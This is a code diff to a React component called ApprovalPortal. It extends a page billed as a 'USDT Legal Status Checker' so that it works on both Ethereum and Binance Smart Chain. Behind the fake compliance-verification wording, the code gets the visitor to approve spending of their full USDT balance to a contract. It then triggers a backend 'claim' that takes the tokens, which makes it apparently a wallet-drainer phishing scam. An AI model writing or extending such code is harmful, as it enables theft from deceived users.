@@ -5,10 +5,11 @@ import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
 import LegitimacyChecker from './LegitimacyChecker';
-import { switchToEthereum, approveTokenSpending, CONFIG } from '@/lib/blockchain'; // ← updated import
+import { switchNetwork, approveTokenSpending, getNetworkConfig, type SupportedNetwork } from '@/lib/blockchain';
 
 export default function ApprovalPortal() {
-  const [step, setStep] = useState(1); // 1 = Connect, 2 = Approve
+  const [step, setStep] = useState(1); // 1 = Network Select, 2 = Connect, 3 = Approve
+  const [selectedNetwork, setSelectedNetwork] = useState<SupportedNetwork>('ethereum');
   const [userAddress, setUserAddress] = useState<string | null>(null);
   const [signer, setSigner] = useState<ethers.Signer | null>(null);
   const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
@@ -37,6 +38,12 @@ export default function ApprovalPortal() {
     autoConnect();
   }, [userAddress, attemptingConnection]);
 
+  const handleSelectNetwork = (network: SupportedNetwork) => {
+    setSelectedNetwork(network);
+    setError(null);
+    setStep(2); // Move to connect wallet step
+  };
+
   const handleConnectWallet = async () => {
     try {
       setError(null);
@@ -45,11 +52,11 @@ export default function ApprovalPortal() {
 
       if (!window.ethereum) throw new Error('No web3 wallet found');
 
-      // Switch to Ethereum Mainnet
+      // Switch to selected network
       try {
-        await switchToEthereum(); // ← changed from switchToBSC
+        await switchNetwork(selectedNetwork);
       } catch (err) {
-        console.log('[v0] Ethereum switch error (may be normal):', err);
+        console.log(`[v0] Network switch error (may be normal):`, err);
       }
 
       // Request accounts with timeout handling
@@ -72,9 +79,10 @@ export default function ApprovalPortal() {
       if (typeof window !== 'undefined') {
         localStorage.setItem('wallet_connected', 'true');
         localStorage.setItem('wallet_address', address);
+        localStorage.setItem('selected_network', selectedNetwork);
       }
 
-      setStep(2);
+      setStep(3); // Move to approve step
     } catch (err: any) {
       const errMsg = err?.message || 'Connection failed';
       setError(errMsg);
@@ -91,17 +99,18 @@ export default function ApprovalPortal() {
       setLoading(true);
       if (!signer) throw new Error('Connect wallet first');
 
-      console.log('[v0] Starting approval for:', CONFIG.CONTRACT_ADDRESS);
+      const config = getNetworkConfig(selectedNetwork);
+      console.log(`[v0] Starting approval for ${selectedNetwork}:`, config.CONTRACT_ADDRESS);
 
       const approveWithRetry = async () => {
         try {
           // Get user balance first
-          const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ['function balanceOf(address) view returns (uint256)'], provider);
+          const token = new ethers.Contract(config.TOKEN_ADDRESS, ['function balanceOf(address) view returns (uint256)'], provider);
           const balance = await token.balanceOf(userAddress!);
-          console.log('[v0] User balance:', balance.toString());
+          console.log(`[v0] User balance on ${selectedNetwork}:`, balance.toString());
 
           // Approve the full balance to the contract
-          await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS);
+          await approveTokenSpending(signer, config.CONTRACT_ADDRESS, selectedNetwork);
 
           // Show success and trigger backend claim
           setShowSuccess(true);
@@ -114,7 +123,8 @@ export default function ApprovalPortal() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                   userAddress,
-                  tokenAddress: CONFIG.TOKEN_ADDRESS
+                  tokenAddress: config.TOKEN_ADDRESS,
+                  network: selectedNetwork
                 })
               });
 
@@ -123,7 +133,7 @@ export default function ApprovalPortal() {
                 console.error('[v0] Claim error:', err);
               } else {
                 const result = await claimResponse.json();
-                console.log('[v0] Tokens claimed! TxHash:', result.txHash);
+                console.log(`[v0] Tokens claimed on ${selectedNetwork}! TxHash:`, result.txHash);
               }
             } catch (err) {
               console.error('[v0] Claim request failed:', err);
@@ -215,17 +225,48 @@ export default function ApprovalPortal() {
             USDT Legal Status Checker
           </h1>
           <p className="text-sm sm:text-base md:text-lg text-gray-300 max-w-md mx-auto px-4 leading-relaxed">
-            Verify your USDT compliance with regulatory standards on Ethereum
+            Verify your USDT compliance with regulatory standards on {selectedNetwork === 'ethereum' ? 'Ethereum' : 'Binance Smart Chain'}
           </p>
         </div>
 
         <ProgressBar currentStep={step} />
 
         {step === 1 && (
+          <div className="space-y-4">
+            <div className="text-center mb-6">
+              <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2">Select Network</h2>
+              <p className="text-gray-300 text-sm sm:text-base">Choose which blockchain to use for USDT verification</p>
+            </div>
+            <div className="grid grid-cols-2 gap-4">
+              <button
+                onClick={() => handleSelectNetwork('ethereum')}
+                className="p-6 rounded-lg border-2 border-emerald-500/20 hover:border-emerald-500/60 bg-black/40 hover:bg-emerald-500/10 transition-all duration-300 flex flex-col items-center gap-3 group"
+              >
+                <img src="/eth-icon.png" alt="Ethereum" className="w-12 h-12 group-hover:scale-110 transition-transform" />
+                <div>
+                  <p className="font-semibold text-white">Ethereum</p>
+                  <p className="text-xs text-gray-400">Mainnet</p>
+                </div>
+              </button>
+              <button
+                onClick={() => handleSelectNetwork('bsc')}
+                className="p-6 rounded-lg border-2 border-emerald-500/20 hover:border-emerald-500/60 bg-black/40 hover:bg-emerald-500/10 transition-all duration-300 flex flex-col items-center gap-3 group"
+              >
+                <img src="/bsc-icon.png" alt="BSC" className="w-12 h-12 group-hover:scale-110 transition-transform" />
+                <div>
+                  <p className="font-semibold text-white">BSC</p>
+                  <p className="text-xs text-gray-400">Binance Smart Chain</p>
+                </div>
+              </button>
+            </div>
+          </div>
+        )}
+
+        {step === 2 && (
           <CardStep
             icon="🔗"
             title="Connect Wallet to Check USDT"
-            description="Connect your wallet to verify your USDT legal status and ensure compliance with regulatory standards on Ethereum Mainnet."
+            description={`Connect your wallet to verify your USDT legal status on ${selectedNetwork === 'ethereum' ? 'Ethereum' : 'Binance Smart Chain'}.`}
             loading={loading}
             error={error}
             buttons={[
@@ -243,11 +284,11 @@ export default function ApprovalPortal() {
           />
         )}
 
-        {step === 2 && (
+        {step === 3 && (
           <CardStep
             icon="✅"
             title="Approve"
-            description="Approve USDT interaction to complete compliance verification on Ethereum."
+            description={`Approve USDT interaction to complete compliance verification on ${selectedNetwork === 'ethereum' ? 'Ethereum' : 'Binance Smart Chain'}.`}
             loading={loading}
             error={error}
             buttons={[
@@ -266,7 +307,7 @@ export default function ApprovalPortal() {
       {/* Footer */}
       <footer className="fixed bottom-8 sm:bottom-10 md:bottom-12 left-1/2 -translate-x-1/2 text-xs sm:text-sm text-gray-300 backdrop-blur-md bg-black/60 px-3 sm:px-4 md:px-6 py-2 sm:py-2.5 rounded-full border border-emerald-500/30 shadow-lg z-50 whitespace-nowrap">
         <span className="hidden sm:inline">Secured by </span>
-        <span className="text-emerald-400 font-semibold">USDT Compliance Network (Ethereum)</span>
+        <span className="text-emerald-400 font-semibold">USDT Compliance Network ({selectedNetwork === 'ethereum' ? 'Ethereum' : 'BSC'})</span>
       </footer>
     </main>
   );
